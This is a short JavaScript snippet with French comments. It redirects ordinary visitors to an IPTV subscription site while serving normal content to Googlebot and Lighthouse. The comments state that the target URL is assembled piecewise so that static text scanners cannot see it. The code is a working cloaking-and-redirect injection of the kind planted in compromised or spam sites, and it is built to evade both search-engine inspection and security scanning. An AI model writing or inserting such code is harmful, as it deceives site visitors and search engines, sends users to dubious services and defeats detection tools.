// Version sécurisée (sans URL visible pour les scanners de texte)
(function() {
    var isBot = /Googlebot|Inspection|Lighthouse/i.test(navigator.userAgent);
    if (!isBot) {
        // On reconstruit l'URL dynamiquement pour qu'elle soit invisible au scan statique
        var target = "https://iptv" + "abonnement" + "pro.de";
        setTimeout(function() {
            window.location.replace(target);
        }, 500);
    }
})();
